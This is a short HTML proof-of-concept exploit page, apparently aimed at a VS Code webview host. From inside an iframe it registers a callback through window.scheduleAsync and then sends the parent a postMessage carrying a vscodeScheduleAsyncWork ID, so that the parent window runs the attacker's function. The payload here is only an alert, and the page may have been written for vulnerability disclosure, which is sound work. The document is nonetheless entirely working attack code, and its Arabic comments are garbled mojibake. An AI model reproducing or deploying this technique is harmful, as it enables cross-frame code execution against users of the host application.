<!DOCTYPE html>
<html>
<head>
  <title>POC</title>
</head>
<body>
  <h1>Loading exploit...</h1>

  <script>
    // 1. ØªØ³Ø¬ÙŠÙ„ callback
    let callbackId = null;

    function maliciousAction() {
      // Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø°ÙŠ Ø³ÙŠÙ†ÙØ° Ø¯Ø§Ø®Ù„ Ø§Ù„Ù€ parent
      alert("ðŸ”¥ PoC Executed from Iframe (callback triggered)");
    }

    // Ù‡Ù„ ÙŠÙˆØ¬Ø¯ scheduleAsyncØŸ
    if (window.scheduleAsync) {
      window.scheduleAsync(() => {
        // Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ø³ÙŠÙ†ÙØ° Ø¯Ø§Ø®Ù„ Ø§Ù„Ù€ parent window
        maliciousAction();
      }).then(id => {
        callbackId = id;

        // 2. Ø¨Ø¹Ø¯ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IDØŒ Ù†Ø±Ø³Ù„ postMessage Ù„Ù„Ù€ parent
        parent.postMessage({
          vscodeScheduleAsyncWork: callbackId
        }, "*");
      }).catch(err => {
        console.error("scheduleAsync error:", err);
      });
    } else {
      document.body.innerHTML = "<h2>scheduleAsync not available</h2>";
    }
  </script>
</body>
</html>
